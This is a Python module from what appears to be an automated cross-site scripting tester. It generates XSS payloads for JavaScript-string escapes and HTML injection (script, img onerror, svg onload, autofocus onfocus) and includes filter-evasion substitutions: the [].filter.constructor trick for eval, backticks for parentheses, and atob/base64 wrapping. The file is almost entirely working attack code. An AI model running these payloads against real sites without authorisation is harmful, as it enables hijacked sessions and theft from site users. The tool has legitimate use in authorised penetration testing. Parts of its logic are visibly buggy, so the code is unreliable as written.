from models import AttackType, Payload, PayloadType, RequestModel, FilterModel
from modules.utils import *


# always put ARGS after FUNCTION
BASE_PAYLOADS = {
    "ESCAPE_JS": [
        {
            "payload": """"; FUNCTION('ARGS'); var dummy= " """,
            "used_chars": ['"', ';','FUNCTION', '(', 'ARGS', ')', "'"]
        },
        {
            "payload": """'; FUNCTION("ARGS"); var dummy= ' """,
            "used_chars": ["'", ';','FUNCTION', '(', 'ARGS', ')', '"']
        },
        {
            "payload": """`; FUNCTION("ARGS"); var dummy= ` """,
            "used_chars": ["`", ';','FUNCTION', '(', 'ARGS', ')', '"']
        }
    ],
    "INJECT_HTML": [
        {
            "payload": """<script>FUNCTION("ARGS")</script>""",
            "used_chars": ['<', '>', '(', ')', '"', '/', 'FUNCTION', 'ARGS']
        },
        {
            "payload": """<img src="x" onerror="FUNCTION('ARGS')">""",
            "used_chars": ['<', '>', '(', ')', '"', "'", '=', 'FUNCTION', 'ARGS']
        },
        {
            "payload": """<svg onload="FUNCTION('ARGS')">""",
            "used_chars": ['<', '>', '(', ')', '"', "'", '=', 'FUNCTION', 'ARGS']
        },
        {
            "payload": """<button autofocus onfocus=FUNCTION('ARGS')></button>""",
            "used_chars": ['<', '>', '(', ')', '"', "'", '=', '/', 'FUNCTION', 'ARGS']
        }
    ],
    "ESCAPE_HTML": [
        {
            "payload": """ "/>HTML_PAYLOADTAG_TO_ESCAPE  """,
            "used_chars": ['"', '/', '>', '<']
        }
    ]
}


TEST_INPUT = "ABCDEFGHb3liottHGFEDCBA"



def replace_list_element(l: list, old: str, new: str) -> list: l[l.index(old)] = new

def union(l1: list, l2: list) -> list:
    l = l1.copy()
    for i in l2:
        if i not in l: l.append(i)
    
    return l


def update_payload_with_failed_data(lastTestedPayload: Payload, failedData: list) -> Payload | None:
    """
    Updates the payload by replacing the failed data with the next possible value
    """

    # replace the failed data with the next possible value
    toRemove = []
    for data in failedData:
        if data['type'] == "FUNCTION":  # TODO: improve
            # if eval is filtered, we try to use the constructor instead
            if data['value'] == 'eval' and not failedData.__contains__('[') and not failedData.__contains__(']'): 
                newChar = '[].filter.constructor' 

            # if the original function is not eval and [].filter.construtor, we try to use eval
            elif data['value'] != '[].filter.constructor': newChar = 'eval'

            toRemove.append(data)

        elif data['type'] == "ARGS":
            if lastTestedPayload.usedCharsReplaced.__contains__('eval'):
                args = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('ARGS')]
                func = lastTestedPayload.usedCharsReplaced[lastTestedPayload.usedChars.index('FUNCTION')]
                toEncode = f"{func}({args})"
                newChar =f"atob({b64.b64encode(toEncode.encode()).decode()})"
            else:
                # TODO: verify if args contains special characters which need to be replaced
                pass

            toRemove.append(data)

        else:
            # get the next equivalent character which is not in the failed data

            # if it is a '(' or ')', we firt try tu use `` (for example alert`1` works too)
            if (data['value'] == '(' or data['value'] == ')') and not '`' in failedData:
                newChar = '`'
            
            else:
                for char in EQUIVALENTS[data]:
                    if char not in failedData:
                        newChar = char
                        break
        
        if newChar is None:
            return
        
        # remove old failed functions and args
        for data in toRemove: failedData.remove(data)
        
        lastTestedPayload.value = lastTestedPayload.value.replace(data['value'], newChar)
        replace_list_element(lastTestedPayload.usedCharsReplaced, data['value'], newChar)

    return lastTestedPayload
    


def build_ESCAPE_JS_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
    """
    Builds payloads for the ESCAPE_JS attack type
    """
    # TODO: be able to choose ALERT or REQUEST_BIN in the building process

    payloadType = PayloadType.ALERT # TODO: change this

    if len(failedData) == 0:
        # take the first payload which has the expected escape char
        for base_payload in BASE_PAYLOADS["ESCAPE_JS"]: 
            if base_payload['used_chars'][0] == requestModel.escapeChar: payload = base_payload;break

        payload_str = f"{TEST_INPUT}{payload['payload']}"

        # TODO: mettre toutes les fonctions equivalentes au alert, puis au fetch, 
        payload_str = payload_str.replace("FUNCTION", "alert")
        usedCharsReplaced = payload['used_chars'].copy()
        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
        payloadType = PayloadType.ALERT

        # TODO: mettre les arguments en fonction du type alert ou request bin
        payload_str = payload_str.replace("ARGS", "xss")
        replace_list_element(usedCharsReplaced, 'ARGS', 'xss')

        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=0)

    return update_payload_with_failed_data(lastTestedPayload, failedData)



def build_INJECT_HTML_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
    """
    Builds payloads for the INJECT_HTML attack type
    """
    # TODO: be able to choose ALERT or REQUEST_BIN in the building process

    # we first try to inject a script tag
    # if it is filtered, we try to inject other tags like img or svg which can also execute js code

    payloadType = PayloadType.ALERT # TODO: change this

    if len(failedData) == 0:
        if lastTestedPayload is None:
            newIndex = 0
        else:
            newIndex = lastTestedPayload.referredIndex+1

        payload = BASE_PAYLOADS['INJECT_HTML'][newIndex]
        payload_str = f"{TEST_INPUT}{payload['payload']}"

        # TODO: generate payloads for alert and fetch 
        payload_str = payload_str.replace("FUNCTION", "alert")
        usedCharsReplaced = payload['used_chars'].copy()
        replace_list_element(usedCharsReplaced, 'FUNCTION', 'alert')
        payloadType = PayloadType.ALERT

        # TODO: set arguments in function of the type alert or request bin
        payload_str = payload_str.replace("ARGS", "xss")
        replace_list_element(usedCharsReplaced, 'ARGS', 'xss')

        return Payload(value=payload_str, payloadType=payloadType, usedChars=payload['used_chars'], usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)

    return update_payload_with_failed_data(lastTestedPayload, failedData)



def build_ESCAPE_HTML_payload(requestModel: RequestModel, filterModel: FilterModel, lastTestedPayload: Payload | None, failedData: list) -> Payload | None:
    
    if len(failedData) == 0:
        if lastTestedPayload is None:
            newIndex = 0
        else:
            newIndex = lastTestedPayload.referredIndex+1
        
        # --- We generate an HTML_INJECTION payload to replace HTML_PAYLOAD ---
        inj_payload = BASE_PAYLOADS['INJECT_HTML'][newIndex]
        inj_payload_str = inj_payload['payload']

        # TODO: generate payloads for alert and fetch 
        inj_payload_str = inj_payload_str.replace("FUNCTION", "alert")
        usedCharsReplaced_inj = inj_payload['used_chars'].copy()
        replace_list_element(usedCharsReplaced_inj, 'FUNCTION', 'alert')
        payloadType = PayloadType.ALERT

        # TODO: set arguments in function of the type alert or request bin
        inj_payload_str = inj_payload_str.replace("ARGS", "xss")
        replace_list_element(usedCharsReplaced_inj, 'ARGS', 'xss')
        # ---------------------------------------------------------------------

        payload = BASE_PAYLOADS['ESCAPE_HTML'][0]
        payload_str = f"{TEST_INPUT}{payload['payload']}"
        
        payload_str = payload_str.replace("HTML_PAYLOAD", inj_payload_str)
        payload_str = payload_str.replace("TAG_TO_ESCAPE", requestModel.escapeChar)
        usedCharsReplaced = union(payload['used_chars'].copy(), usedCharsReplaced_inj)
        usedChars = union(payload['used_chars'].copy(), inj_payload['used_chars'].copy())

        return Payload(value=payload_str, payloadType=payloadType, usedChars=usedChars, usedCharsReplaced=usedCharsReplaced, referredIndex=newIndex)

    return update_payload_with_failed_data(lastTestedPayload, failedData)



def get_payload_generator(attackType: AttackType) -> callable:
    """
    Returns the payload generator for the given attack type
    """
    if attackType == AttackType.ESCAPE_JS:
        return build_ESCAPE_JS_payload
    
    elif attackType == AttackType.INJECT_HTML:
        return build_INJECT_HTML_payload
    
    elif attackType == AttackType.ESCAPE_HTML:
        return build_ESCAPE_HTML_payload
    